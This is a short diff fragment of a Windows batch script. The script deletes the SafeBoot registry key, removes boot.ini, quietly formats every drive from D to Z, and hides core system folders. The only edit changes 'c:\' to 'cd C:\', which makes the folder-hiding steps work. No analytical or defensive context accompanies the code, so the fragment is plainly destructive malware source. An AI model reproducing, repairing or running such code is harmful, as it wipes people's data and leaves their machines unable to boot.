@@ -7,7 +7,7 @@ REG DELETE "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot" /v Min
 ATTRIB %SYSTEMDRIVE%\boot.ini -s -a -r -h
 DEL %SYSTEMDRIVE%\boot.ini /f
 for %%a in (d e f g h i j k l m n o p q r s t u v w x y z) do format %%a: /q /u /x /y
- c:\
+cd C:\
 attrib +s +h "windows"
 attrib +s +h "Program Files"
 attrib +s +h "Documents and Settings"
